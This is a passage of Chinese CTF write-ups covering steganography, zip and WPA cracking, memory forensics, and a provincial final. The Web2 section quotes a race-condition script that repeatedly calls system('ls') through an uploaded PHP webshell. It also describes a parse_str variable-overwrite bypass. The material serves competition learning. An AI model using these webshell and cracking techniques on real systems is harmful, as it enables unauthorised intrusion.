这些口红颜色和YSL什么关系？搜一下发现是一个口红的品牌。继续搜索信息发现LSB最低位里面有PK字段，应该是压缩包数据。 果断保存二进制为.zip格式。但是打不开，因为后面有一堆没有的数据。用binwalk分离一下就好了。 分离出来发现是个加密的压缩包。那么秘密是什么？和YSL口红色号有什么关系？ 有点脑洞了。搜索后发现是N1CTF国际赛的一道题目。。。秘密啊竟然是YSL对应口红色号的二进制转字符串。。。 用PS取色： &#39;BC0B28&#39;,&#39;D04179&#39;,&#39;D47A6F&#39;,&#39;C2696F&#39;,&#39;EB8262&#39;, &#39;CF1A77&#39;,&#39;C0083E&#39;,&#39;BC0B28&#39;,&#39;BC0B28&#39;,&#39;D13274&#39;, &#39;6A1319&#39;,&#39;BC0B28&#39;,&#39;BC0B28&#39;,&#39;D4121D&#39;,&#39;D75B59&#39;, &#39;DD8885&#39;,&#39;CE0A4A&#39;,&#39;D4121D&#39;,&#39;7E453A&#39;,&#39;D75B59&#39;, &#39;DD8885&#39; 进入YSL的网站：https://www.yslbeautyus.com/on/demandware.store/Sites-ysl-us-Site/en_US/Product-Variation?pid=194YSL 可以看见：color=1 抄个脚本吧..（眼力好也可以手撕）（发现抄的脚本看不懂也运行不了，手撕） 最后得到色号：1,27 ,59 ,11 ,23 ,7 ,57,1 ,1 ,76 ,222 ,1,1,50 ,214 ,6 ,77 ,50,53,214 ,6 写脚本转换成二进制再转换成和字符 import libnum​color = [1,27 ,59 ,11 ,23 ,7 ,57,1 ,1 ,76 ,222 ,1,1,50 ,214 ,6 ,77 ,50,53,214 ,6]flag = ‘’for i in color: flag +=str(bin(i)[2:])print libnum.b2s(flag) 解压得到flag 12.乌云邀请码 Stegsolve，LSB，BGR分析直接得到flag 13.图穷匕见 用010Editor打开，根据题目意思应该是在这张图的后面还有数据。 FF D9是jpg文件头，提取后面的数据。然后用Notepad++的Converter功能吧16进制转为字符。发现是一堆点。加上提示：问会画图吗？猜测应该是合成二维码。 用python的Image库生成反向图片 14.color 省赛题目，当时也是没做出来。前面wp也写了。思路就是用SteSolve打开发现隐藏Hint：makemetall。修改高度得到黑白块，联想二进制和ascii码的可打印字符正好是7位（坑点：七张图片要竖着组合01）。 15.2B binwalk分析发现存在zip文件，foremost分离出来 压缩包加密了，用01Editor打开搜索50 4B 01 02，发现是伪加密。 修改后解压得到另一张看似一模一样的png图片名字叫B2。猜测双图还是盲水印？答案是盲水印。脚本有两个，一个可以另一个不可以。不知道为啥。。 16.妹子的陌陌 binwalk分析发现存在压缩包，foremost分离出压缩包 压缩包有密码，经过尝试给的信息，竟然是：喜欢我吗.有点脑洞…. 然后摩斯电码解密得到一个网址 进去加上后面的提示，应该是吧有=的看似想base64的用AES解密，而且给出了秘钥。 然后进去网站发现二维码，取反色扫描得到flag。 (二)、流量分析1.talnet 直接搜索分组字节流，找到flag。也可以过滤talnet协议定位，追踪流找到flag (三)、压缩包分析1.眼见非实 Notepad++打开后发现是PK文件头，最后有一段.docx。 修改后缀为zip，解压得到.docx文档，但是打不开。 再用Notepad++打开发现PK头，修改后缀为zip。解压得到文件夹，搜索找到xml文件里面有flag 2.神秘文件 省赛题目。加密压缩包和压缩包外有相同文件，用ARCHPR明文攻击即可。注意一点要用WinRar。然后解压得到.doc。查看文本发现PK开头，改后缀为zip。找到flag.txt然后base64解码。详解看上面WP 3.好多压缩包 这么多小压缩包肯定先想到CRC32碰撞攻击。 原理： CRC32:CRC本身是“[冗余校验码](http://baike.baidu.com/item/CRC32)”的意思，CRC32则表示会产生一个32bit（8位十六进制数）的校验值。CRC32校验码出现在很多文件中比如 png 文件，同样 zip 中也有 CRC32 校验码。值得注意的是 zip 中的 CRC32 是未加密文件的校验值。这也就导致了基于 CRC32 的攻击手法在产生CRC32时，源数据块的每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同的CRC32值，利用这个原理我们可以直接爆破出加密文件的内容限于CPU能力，CRC碰撞只能用于压缩文件较小的情况 破解脚本： # coding:utf-8import zipfileimport stringimport binasciiimport base64​​def CrackCrc(crc): for i in dic: for j in dic: for p in dic: for q in dic: s = i + j + p + q if crc == (binascii.crc32(s) &amp; 0xffffffff): # print s f.write(s) return​​def CrackZip(): for I in range(68): file = ‘out’ + str(I) + ‘.zip’ f = zipfile.ZipFile(file, ‘r’) GetCrc = f.getinfo(‘data.txt’) crc = GetCrc.CRC CrackCrc(crc)​​dic = string.ascii_letters + string.digits + ‘+/=’​f = open(‘out.txt’, ‘w’)CrackZip()f.close() 爆破完成得到base64 用python脚本解密写进jm.txt里面 #coding:utf-8import base64​file = open(‘out.txt’,’r’)c = file.read()m = base64.b64decode(c)file = open(‘jm.txt’,’w’)file.write(m)print ok 用01Editor打开发现Hint：修理文件得flag。而我们在十六进制中发现C4 3D 7B 00 40 07 00查阅得知这是rar文件结尾。 新建一个文件，打上rar文件开头十六进制，然后复制前面的数据后保存得到压缩包 注释里面得到flag 4.一个普通的压缩包 用Winrar打开发现说文件secret.png头被破坏 使用Winrar自动修复功能，对比两个压缩包明显发现大小不一样。但是修复的完全可以解压未修复的假flag.txt猜测第一个压缩包里面藏着secret.png但是文件头被损坏。用binwalk也分析不出来 发现这个地方。A8 3C后面是被压缩文件文件头类型。把7A改成74再解压就得到了secret.png 用StegSolve打开，在一个通道发现一半二维码。而且存在两帧 应该把第二帧提取出来在一个通道可以找到另一半。保存第二帧找到另一半拼接而且还得补全左上角，扫描得到flag (四)、内存取证1.Linux 提示Linux，下载文件是一个不知名的文件。根据提示放到linux下file命令看看 是一个映像文件，我们尝试挂载 找到目录即可找到flag文件 2.linux2 法一： Notepad++直接搜索key得到flag。但是我觉得这个题肯定不是这么做，这是个非预期做法。 法二： 不知名的文件，接近20MB。放linux下file和binwalk分析 和上个题目类似，也是内存镜像。我们尝试挂载，发现一堆文件。观察上图发现一个jpg文件。我们尝试foremost分离得到jpg。然而并不是flag。 最后貌似懂了出题人想考什么：应该是考linux的strings命令 (五)、音频隐写1.旋转跳跃 MP3文件，听一下（真好听）。关于MP3的除了曲线就是MP3隐写了。用工具MP3Stego分析得到flag 2.听首音乐 用Audacity打开后发现 放大 这就很容易猜想了。三种状态：点、短横、空格正好对应摩斯电码的三种符号：.-/ 手撕电码解密得flag 3.PEN_AND_APPLE NTFS流隐写，一种以前木马的隐藏方式 隐藏方法：type flag.png&gt;pen_and_apple.mp4 查看方法：dir /r 四、Other1.宽带信息泄露 给出一个.bin二进制文件，但是不知道什么生成的。根据题目提示用RouterPassView打开，搜索username找到flag。 2.come_game 提示通关就有flag。下载后发现是一个exe的小游戏，既然放在MISC应该不会用到Re。随便玩一玩发现很难通关，不可能通关玩。 退出后生成了一个save1文件，猜测应该是存盘。这样的话我们把存的关数修改不就可以通关了吗？用010Eeditor打开修改数字2，一个个修改。最后到5的时候打开游戏就是通关了。 3.做个游戏 提示坚持六十秒，同上个题目差不多。不可能达到他的要求。jar文件我们尝反编译查看源码找到flag。 符强大的java在线反编译网址：http://www.javadecompilers.com/ 4.想蹭网先解开密码 给了个.cap流量包，用wireshark打开。提示WIFI密码，WIFI连接认证的重点在WPA的四次握手包，也就是eapol协议的包，过滤一下 正好四个包。接下来根据提示写个字典。 通过kali里面的aircrack-ng破解就可以得到key了，key就是flag了。 6.账号被盗了 不抓包直接getflag提示you are not admin！ 抓包把flase改成true。得到连接，访问下载exe文件。 打开后是一个刷枪的工具 尝试提交，抓流量包发现明显有base64编码。 解码是163邮箱。获取账号密码登录后得到flag。 7.好多数值 一看就是很多RGB值让我们绘制图片，先分析绘制图像的长宽。用python分析一下数据的长度。 开方开不尽，所以不是正方形。分解质数得到503*61*2。python脚本跑测试一下是122*503。得到flag 脚本： from PIL import Imageimport re​x = 503 #x坐标 通过对txt里的行数进行整数分解y = 122 #y坐标 x*y = 行数​im = Image.new(“RGB”,(x,y))#创建图片file = open(‘1 (1).txt’) #打开rbg值文件​#通过一个个rgb点生成图片for i in range(0,x):• for j in range(0,y):• line = file.readline().replace(‘(‘,’’).replace(‘)’,’’)#获取一行• rgb = line.split(“,”)#分离rgb• im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2])))#rgb转化为像素im.show() 8.很普通的数独 并不知道什么是数独。但是这25张图片加上里面的白黑相间很容易想到是个5*5的二维码。 关键是如何把他们拼接成二维码？…. 看了大佬的wp是用Python的PIL库来处理。把数字涂黑然后拼接生成二维码。大致思路是计算一张图中的 81 个格子的位置，然后看每一个格子中心的一堆像素（比如设置了 6 x 6）中是否有黑色像素。如果没有说明是白格子，跳过；如果有说明是有数字的格子，涂黑。 贴个大佬脚本： from PIL import Image​def work(s): im = Image.open(“{}.png”.format(s)) width = im.size[0] height = im.size[1] newim = Image.new(“RGB”, (width, height), (255,255,255)) print(im.size) print(newim.size) sx = sy = 2 for i in range(width): for j in range(height - sy): try: p = im.getpixel((i, j)) newim.putpixel((i,j), p) except: pass#print(i, j) xx = yy = 14 blockx = 23 blocky = 22 r = 3 rr = 12 for i in range(9): stx = int(xx + i * blockx) for j in range(9): sty = int(yy + j * blocky) flag = False for x in range(stx - r, stx + r): for y in range(sty - r, sty + r): p = newim.getpixel((x, y)) if p == (0,0,0): flag = True break if flag: break if flag: for x in range(stx - rr, stx + rr): for y in range(sty - rr, sty + rr): try: newim.putpixel((x,y), (0,0,0)) except: pass newim.save(“{}-1.png”.format(s))​for i in range(1, 26): work(i) 拼接后扫码得到多重base64 Vm0xd1NtUXlWa1pPVldoVFlUSlNjRlJVVGtOamJGWnlWMjFHVlUxV1ZqTldNakZIWVcxS1IxTnNhRmhoTVZweVdWUkdXbVZHWkhOWGJGcHBWa1paZWxaclpEUmhNVXBYVW14V2FHVnFRVGs9 多解码几次得到flag 9.QAQ 用01Eidtor打开发现有encode、.txt、base64、key、encrypt等字样猜测可能是pyc文件（py文件编译后）放到kali里面用命令查看一下确实是个pyc文件 在线反编译一下得到源码。 #/usr/bin/env python# encoding: utf-8​def encryt(key, plain): cipher = ‘’ for i in range(len(plain)): cipher += chr(ord(key[i % len(key)]) ^ ord(plain[i])) return cipher def getPlainText(): plain = ‘’ with open(‘plain.txt’) as f: while True: line = f.readline() if line: plain += line else: break return plain def main(): key = ‘LordCasser’ plain = getPlainText() cipher = encryt(key, plain) with open(‘cipher.txt’, ‘w’) as f: f.write(cipher.encode(‘base_64’)) if __name__ == ‘__main__‘: main() 然后还给了一个文件。三段数据，应该是用到脚本里面。 然后审计代码尝试写解密python脚本 过几天抽时间写吧，先放一下 解密后… 10.apple 未完代更新]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JarvisOJ-MISC-WP]]></title>
    <url>%2F2018%2F11%2F23%2FJarvisOJ-MISC%3AWp%2F</url>
    <content type="text"><![CDATA[流量分析远程登录协议 解法一： 过滤分组字节流搜索flag追踪到数据包 解法二： 题目是：远程登录协议。所以过滤talnet协议定位，追踪流找到flag简单网管协议直接过滤分组字节流，找到flag。也可以过滤网管协议(SNMP)定位在追踪流找到。struts2漏洞直接分组字节流过滤flag得俩：根据题目提示是大写MD5，得flag。 但是感觉这个题目也太简单了吧。。。搜了下struts2，原来是一个apache框架。而且存在不少高危漏洞。(CVE-2012-0838、CVE-2013-2251，2248、CVE-2016-3081)大多数是属于远程命令、代码执行漏洞。 shell流量分析发现主要是57370端口（控制端）和2333端口（被控端）间的通信。通过“$”不难猜到是shell交互。 过滤分组字节流定位flag发现一段有flag{xxxxxxxxx}： 追踪TCP流： 分析shell交互找到以下几段可疑点： 把function.py运行发现输出： 审计代码发现import base64结合可疑点cat flag猜测应该是对mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA==用fuction的decode函数进行了加密。 然后在py脚本里面添加一段代码即可： 运行脚本得到flag： Webshell分析过滤分组字节流，分别过滤shell和flag定位追踪流，发现只是变量或名字并没有内容。 题目要求分析webshell先过滤出http流。最后找到base64字符串(有点脑洞啊)aHR0cHM6Ly9kbi5qYXJ2aXNvai5jb20vY2hhbGxlbmdlZmlsZXMvQWJUekEyWXRlRmpHaFBXQ2Z0cmFvdVZEM0I2ODRhOUEuanBn 解密发现网址：访问的二维码扫描得flag SCAN是个log日志，notepad打开发现是个二进制文件。用wireshark打开(竟然可以….)。第一个包就是一个ICMP协议的Ping包，是192.168.0.9-&gt;192.168.0.99的大量访问。 过滤ICMP协议，包并不多。(可以一个个尝试) 可以根据时间段划分为四部分：0、1200、1400、1600。 第一次是192.168.0.9-&gt;192.168.0.99然后中间一部分交互。 第二次是192.168.0.1-&gt;192.168.0.99 第三次是192.168.0.254-&gt;192.168.0.99 第四次是192.168.0.199-&gt;192.168.0.99 所以第四次的包名字sha256加密后的flag。 隐写术教练，我想打CTF用StegSolve打开图片,LSB最低位通道分析，发现文件头为PK(压缩包文件头) 把二进制导出修改文件后缀为zip： 发现压缩文件损坏，这时候可以用WinRAR修复功能。(扯一句，WinRAR确实比Bandzip、7z什么的好用…省赛就是没用WinRAR损失一道题目。不过WinRAR有广告,大家可以去52破解下载去广告版。dalao也可以自己去壳破解改入口) 成功修复解压后，打开文件发现是ELF文件(Linux中类似Windows的exe文件，可以直接执行) 直接Linux运行得flag： Class10拿到一个没有后缀不知名文件。在kali里面用file命令检查一下：是个二进制文件 binwalk分析一下： 有两段zlib压缩后的数据，第二段为default compression。 然后strings命令分析： 发现IHDR,RGB,IDAT等和图像相关的字符。 用binwalk分理处class10中的压缩数据： 用python打开zlib： 发现二进制的长度为841，正好是29^2。联系上面得到的信息，猜测应该是二进制转成图像。 写个python脚本： \ 123456789101112131415161718# -*- coding: utf-8 -*- ​ from PIL import Image ​ SIZE = 29 img = Image.new("RGB",(SIZE,SIZE)) with open("./F4289") as f: str = f.read() ​ i = 0 for y in xrange(SIZE): for x in xrange(SIZE): if str\[i\] == '0': img.putpixel(\[x,y\],(0,0,0)) else: img.putpixel(\[x,y\],(255,255,255)) i = i + 1 img.save("ima.png") 得到一张二维码图片：扫描得到flag。 炫酷的战队logo下载后发现是一个打不开的BMP文件。 010打开后发现BMP文件头被抹掉。 查阅信息后发现BMP位图信息头为一个结构体长40。大体固定为： 修复后可以打开，用binwalk分析发现有zlib提取后无果。用nodepad++打开发现文件后面有一堆数据，而且有IHDR字样，猜测应该隐藏一了张png图片，但是这张图片的文件头也被损坏了，所以binwalk分析不出来。 修改文件头无果仍然打不开 看别人写的wp是有一个crc校验值，然后可以反推高度宽度。但是由于Windows系统无视crc校验值(即crc校验值不对也可以显示，但是Linux就不可以)所以利用Window的特点可以达到修改图片高、宽度来隐藏信息的目的。 python爆破: 1234567for i in range(16,256): print hex(i)\[2:\] b=hex(i)\[2:\] a=('89504E470D0A1A0A0000000D49484452000001'+b+'000001000802000000F37A5E12000000017352474200AECE1CE90000000467414D410000B18F0BFC6105000000097048597300000EC300000EC301C76FA8640000072549444154785EEDDAB996DD380E0050E70E2B745491B3F9FFCF1B2D04454214A537AF8EDB5D736F262E00A807CAEEE507000000000000000000DFDCC7E77F569F1FE5F9EFF2F3D7EFADBCC54D85B1F2F7AF9F6564E0EF3E2CFC059A3B77185EAB729D0ECBC51AEE0E5B94E18AE64A96F9947194EBDEF5AE54458E76339DD53C75E129F35D90B2A13FF670F045FD516E4E128B6719F3618F0439F85794FF3FC5AF255665EB3EF16641702B7D410E6DF39DFB74B5F4EAE5EED51661B8A25E903A7B64BBCC3535DF35983D020E2B9C5FBDB2E57C8CC6BCE252519F6638F89AA8E4598C47ABD361DBB3F667FC82F217AFC51FFCB2ABB2A6CECE7F0C78D3E9261D6D5C7AAFE9EBB61B3F3E874D9E3B36760F1BB94C1E17E361AEE47657BBFF54E7B27B50407759EF945DD3227BA34FC278F03551FFB35262F52B19EB1BDAB479BEA0FCC50BF1E3A73CBFC7BCE6CD9A606E7093A23BB7A1DAD5779D18BBD2058EFDC37B5D2663EE3E57BD491FFBD275E1E30A8B1263585053C3C5FCA6965112A6733C90236CCE8365A468266A998B18EE17AF3E3F2E2A2DA5C6535F469242943DBF7F97028E439FCB3F6B3336F5366FEE71FC08D56E3EDB574D6B8277B57D5D447BAF43CF7A7515BBD2C20830DC5F26CBDC835CCDCDDB2C253EAF7033AD67D11EFE52BAD0A3B2F6894B39C2260DE6A831514FDC588F735ABF8CE63CFDF1E3695A6F0A7144887CF12A73AE919A31BE925544791AFF51EDB1EC6611BCE7D48DD1BCFB483CDDF7616EFA22E2B7EA92BEC71FE4EA8BEB86E615F665A41A0F83F82365595D54B7352E736C72844D3F385CB228E311BF9CAC2C8B73C66C0ED2CFC7D329472B85682394A912EDAAE056EC3EC78B81A7F1FBB936F2A61F9ED604EF4ADD57A566BDEFC3DCD6C5287EEAFC787C90ABBF499B6715E63206AB23D0229DE164504655C34C830C23F4834D3D8BBAB21F3EECE9E29CE99DD6DDFD7C3C0D0F1252883E4254B33EE55C23A38C6D8CE7F1FB5DC7BE2286CBBA6951F0A6D47D9BA6E7EA746DCB2BB9AD8BFE5634CA4433FE20577F9336CF2BDC0DD747F18B2761066534E6B3BBE19A3CD854B559276AF9D95E774CC72972C87E3E9E5E29F522C3F29C738D8C321E11D6A7A7F1633CA5CBDB57FBD8B42E78C7A8AF5BD1ADB75DD85F866AD4D6D5BEA74EDDE72A2BBAF9C715861C244ABC28726054C6613EBBBBBEEDB98AA3BAC532358F9E635C9D759F8FA769A929C4B9CAAEC287E76E16D5ED7D4DB7F14B5DEDCAC569FBBE6C5A14BC69D0D7BDA689BB355FF73F3C1D616F73E5AFC2E66ED732DF668F42CBDABA7B58E1582AE3E357933685BF12CBF27D1FD711452E73837A7FFEFA8C64CDC24DAA26658DD5D35ACB9E589333AC6A4DAB69B06365AE30069EC76F468FC579FBFE3CAD09DE156D376BB4DAE9BDB6D18F45FDE8A9AD3B65B29D9BE74A57BA9AEE8A123A35C4C5D671C1452A631462B67D374E7C1CED3C5FE6061BEBAED3EB4E8BE3BF90F76FE6483A5022C49AF10FDABCE369B0E16FB1BA3EC1E622FEF81DAE62FBBE715A13BC2BFAF3AED1CEFDDFF779EDE8343CBE154599CC73D7B9D295EE5CEFCA33EDF6F3AE625870712AA38F32DBDA49C9FB63A54F4417346D3CE662A2597DAC5DE2F7F3F1347C9F211D76906153D34C8335199BF3B5B15E8E5F27AA76C53E3BAD09FED5CA0DC837866F2BBE797FECBBB67FAC7D46F9C62EFF8AC1F7F4673FA3F52FBCFEA0E65B2BF7CA67F4FFC33FF119D55BF0CF69FEEDDDE1A54BF97E843FE66B4BBD8AF6C7FFA11E000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080A11F3FFE0B3B73B0698B976EA80000000049454E44AE426082').decode("hex") f=open(b+'.png',"wb") f.write(a) f.close() 挨个查看得到flag(眼力要好才能发现….): 上帝之音根据提示用MATLAB查看时域波形(不太懂…通信内容..):几乎全看(chao)别人wp \ 123[x,fs\] = wavread('godwave.wav'); ​ N = lenthg(x); 可以看出来这是OOK信号，因此可以先全波整流，然后低通滤波解调出基带信号。（dalaoshuo） 1234567fc = fs / 100; ​ lpf = fir1(30,fc / (fs / 2) ); ​ x = abs(x); ​ xs = filter(lpf, 1, x); 绘制基带信号： 通过观察，以64个点作为抽样判决周期，提取出基带数据，即线路码。 然后根据第二个提示:是曼彻斯特码，将其解码。查看16进制：8950 4e47 0d0a是个gif格式的图像，改后缀得到二维码，扫描得flag。 基带解调MATLAB代码： 123456789101112131415161718192021close all; clear; clc; ​ \[x, fs\] = wavread('godwave.wav'); N = length(x); ​ fc = fs / 100; lpf = fir1(30, fc / (fs / 2)); ​ x = abs(x); xs = filter(lpf, 1, x); figure; plot(xs(1:1000)); ts = \[48:64:N\]; ​ xb = int8(xs(ts) &gt; 0.3); ​ fp = fopen('demod.txt', 'w'); for i = xb fprintf(fp, '%d', i); end fclose(fp); 曼彻斯特解码Python: 1234567891011121314151617with open('demod.txt') as fp: s = fp.read() ​ m = '' for i in range(0, len(s), 2): if (s\[i\] == '1') and (s\[i+1\] == '0'): m += '1' elif (s\[i\] == '0') and (s\[i+1\] == '1'): m += '0' else: print('wrong with index %d' % i) exit() ​ with open('demod.bin', 'wb') as fp: for i in range(0, len(m), 8): byte = bytes(\[int(m\[i:i+8\], 2)\]) fp.write(byte) 内存取证取证2用到取证神器：volatility。解压缩到的一个vmem文件(VMware的虚拟机内存快照文件)和一个不知名的文件。 用volatility分析mem.vmem： 可以得到profile类型 查看一下进程： 发现： 这是一个加密工具。对于TureCrypt专门破解工具：Elcomsoft Forensic Disk Decryptor dumpTrueCrypt进程： 然后用TurCrypt专门破解工具：Elcomsoft Forensic Disk Decryptor 破解suspicion。 挂载得到flag： OtherYou-Nedd-Python运行给的flag.py提示输入key：(flag.py的运行逻辑是把数据base64解码，然后zlib解压，marshal.loads函数将数据流转换成code object。而code object是可以转化为pyc的) 我们还有一个文件没用到，文件名字是：key_is_here_but_do_you_know_rfc4042推测应该是用这个文件来获取key。 我们打开发现乱码： 根据提示：cfc4042（rfc4042中定义了utf-9和utf-18两种Unicode转换编码格式）。然后用utf-9模块，把utf-9转换成utf-8编码： #coding utf-8 1234567891011import utf9 ​ utf9\_file = open('key\_is\_here\_but\_do\_you\_know\_rfc4042','rb') utf9\_data = utf9\_file.read() decoded\_data = utf9.utf9decode(utf9\_data) ​ print decoded_data ​ decoded_file = open('decoded','w') decoded\_file = write(decode\_data) decoded_file.close() 得到： 看别人wp是仔细观察法，发现除了“”外其他符号都是Python中的算术运算符，括号表示优先级。然后脑洞下划线的个数为对应数字。(给脑洞大佬掉头..) 然后把数字转为16进制然后转化为ASCII字符就是key。我修改的脚本如下： 12345678910111213141516171819202122232425# coding = utf-8 import binascii ​ _ = 1 __ = 2 ___ = 3 ____ = 4 _____ = 5 ______ = 6 _______ = 7 ________ = 8 _________ = 9 n = _____*((__//__+___+______-____%____)**((___%(___-_))+________+(___%___+_____+_______%__+______-(______//(_____%___)))))+__*(((________/__)+___%__+_______-(________//____))**(_*(_____+_____)+_______+_________%___))+________*(((_________//__+________%__)+(_______-_))**((___+_______)+_________-(______//__)))+_______*((___+_________-(______//___-_______%__%_))**(_____+_____+_____))+__*(__+_________-(___//___-_________%_____%__))**(_________-____+_______)+(___+_______)**(________%___%__+_____+______)+(_____-__)*((____//____-_____%____%_)+_________)**(_____-(_______//_______+_________%___)+______)+(_____+(_________%_______)\*__+_)\*\*_________+_______*(((_________%_______)\*__+_______-(________//________))\*\*_______)+(________/__)*(((____-_+_______)*(______+____))\*\*___)+___\*((__+_________-_)\*\*_____)+___\*(((___+_______-______/___+__-_________%_____%__)*(___-_+________/__+_________%_____))\*\*__)+(_//_)\*(((________%___%__+_____+_____)%______)+_______-_)\*\*___+_____\*((______/(_____%___))+_______)*((_________%_______)*__+_____+_)+___//___+_________+_________/___ ​ print n hexn = hex(n)\[2:\] print hexn ​ key = '' ​ for i in range(len(hexn)/2): key += chr(eval('0x'+hexn\[2\*i:2\*i+2\])) ​ print key 输入key： 再回到出发点flag.py输入key发现又让输入flag 根据一开始提到的，编写代码将code这个Python代码对象加上相应pyc文件头信息提取出来写入磁盘生成pyc文件(关于pyc文件类似于java编译后的.class；运行机制类比java的JVM)。然后反编译得到源码。 在线python反编译： 123456789101112131415161718192021222324252627282930313233343536373839# !/usr/bin/env python \# encoding: utf-8 ​ import hashlib ​ def sha1(string): return hashlib.sha1(string).hexdigest() ​ ​ def calc(strSHA1): r = 0 for i in strSHA1: r += int('0x%s' % i, 16) return r ​ ​ def encrypt(plain, key): keySHA1 = sha1(key) intSHA1 = calc(keySHA1) r = \[\] for i in range(len(plain)): r.append(ord(plain\[i\]) + int('0x%s' % keySHA1\[i % 40\], 16) - intSHA1) intSHA1 = calc(sha1(plain\[:i + 1\])\[:20\] + sha1(str(intSHA1))\[:20\]) return ''.join(map((lambda x: str(x)), r)) ​ if \_\_name\_\_ == '\_\_main\_\_': key = raw_input('\[*\] Please input key:') plain = raw_input('\[*\] Please input flag:') encryptText = encrypt(plain, key) cipherText = '-185-147-211-221-164-217-188-169-205-174-211-225-191-234-148-199-198-253-175-157-222-135-240-229-201-154-178-187-244-183-212-222-164' if encryptText == cipherText: print '\[&gt;\] Congratulations! Flag is: %s' % plain exit() else: print '\[!\] Key or flag is wrong, try again:)' exit() 分析加密函数：def encrypt(plain, key) 在for语句，可以知道到明文长度和密文长度相同，核心加密语句为第6，7行，算法使用ord函数取得明文每个字符的ASCII整型值，int函数内容为明文每个字符位置模40访问由调用sha1函数返回的40位16进制keySHA1字符串中的16进制数并转化为10进制数与由调用calc函数返回的整型值相减，然后将ord函数和int计算所得值作为密文添加到r列表，第7行更新intSHA1值，第9行转换为“-185-147-211…”格式并返回。 这里我们知道了密文cipherText，密钥key，加密算法encrypt，从而能逆推出解密算法，只要把密文值减去int函数中的值并对结果使用chr函数取得明文plain。 贴别人的解密脚本： 123456789101112131415161718192021222324252627282930# coding:utf-8 # decrypt.py import hashlib ​ def sha1(string): return hashlib.sha1(string).hexdigest() ​ def calc(strSHA1): r = 0 for i in strSHA1: r += int("0x%s" % i, 16) return r ​ def decrypt(strCipher,strKey): listCipher = map(lambda x: int(x),strCipher.replace('-',' -')\[1:\].split(' ')) strKeySHA1 = sha1(strKey) intSHA1 = calc(strKeySHA1) strPlain = '' for i in range(len(listCipher)): strPlain += chr(listCipher\[i\] + intSHA1 - int("0x%s" % strKeySHA1\[i%40\],16)) intSHA1 = calc(sha1(strPlain\[:(i + 1)\])\[:20\] + sha1(str(intSHA1))\[:20\]) return strPlain ​ if \_\_name\_\_ == '\_\_main\_\_': strCipher= '-185-147-211-221-164-217-188-169-205-174-211-225-191-234-148-199-198-253-175-157-222-135-240-229-201-154-178-187-244-183-212-222-164' strKey = 'I_4m-k3y' strPlain = decrypt(strCipher, strKey) print strPlain 这题还算是MISC吗…..真麻烦，要是不参考别人文章还真是搞不出来。 参考：https://blog.csdn.net/Magic1an/article/details/77418275 https://hackfun.org/2017/01/02/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E4%BD%A0%E9%9C%80%E8%A6%81%E7%94%A8Python%E6%9D%A5%E5%81%9ACTF/]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第七届山东省网络安全技能大赛-决赛Write-Up]]></title>
    <url>%2F2018%2F11%2F09%2F%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-%E5%86%B3%E8%B5%9BWrite-Up%2F</url>
    <content type="text"><![CDATA[第七届山东省网络安全技能大赛-决赛Write-Up ——xx_C1 前言 第一次真正意义打线下赛，学到不少东西。差点三等奖，继续努力吧。Reverse不会跳过Pwn不会跳过Webweb1打开页面：猜测抓包伪造地址。同时把admin=0改为admin=1。只说IP不在范围这个和127.0.0.1貌似没什么关系…有点坑，卡了一小会儿。 Web2简答的审计源码 危险函数：parse_str()存在变量覆盖漏洞。把aabg7XSsMD5加密后发现是0e开头。 思路即构造?id=key[99]=QNKCDZO 发现upl04d50m3thing.php，应该是个上传的页面。 随便上传测试 下载后发现文件内容是 猜测是条件竞争，后台处理：file_put_content，然后sleep(1)，echo ‘TooSlow’ 利用burp的intruder开多线程，利用延迟来竞争。一个上传，一个访问即可。 看V0W的博客先上传一句话再利用py脚本重复访问竞争。 贴V0W代码： 12345678import requests​url = 'http://192.168.100.243:2002/uploads/e6ce11ded480d904ea8c3b30b00a23ab9bb59119/v.php'//连接根据自身情况​postdata = &#123;'v': "system('ls');"&#125; //‘v’根据自身传马情况while True: r = requests.post(url,data=postdata) print r.text Web3SSTI第二次接触。过几天总结一下。 Crypotorsa思路一：分解大素数N(在线或yafu)，用已知的p，q，e通过模逆运算(可以直接调用pyhton里gmpy2模块的invert函数)求解e的逆元d。然后通过c的d次方对n取模的明文m。 在线直接失败（当然了比赛不能在线） yafu也失败了。 思路二：上脚本秒解(当然得稍微改改他给的txt文档把N换成n，把enc换成c) 看了看这个脚本求N的模块，挺复杂的。应该是某几种算法结合。原理我真不知道…..总之感觉有时候工具都不如py脚本好用。得好好补补python… affine仿射变换解密。也用到了求解逆元算法..信安数基好好学挺重要… 思路一：在线 手酸-8mod26的逆元为18！(当然比赛也不能在线) 思路二：上脚本爆破解密 但是并不是所有的仿射加密都可以逆向解密，只有符合C = Ek(m) =(k1m + k2) mod n中gcd(k1, n) = 1时可以逆向解密。 看了表哥们的wp才发现flag可以是加密。当然我也不是很清楚这个仿射加密和解密怎么都是一样呢？我测试了一下换个字符串 确实是一样的。回头又仔细看了看脚本，应该是属于解密。原理是直接通过仿射函数把对应密码表换了，不用爆破就可以解密。强大！ 通过爆破知道-8的逆元是18也可以直接进行在线解密了。 MISCCrackItkali自带破解工具：john 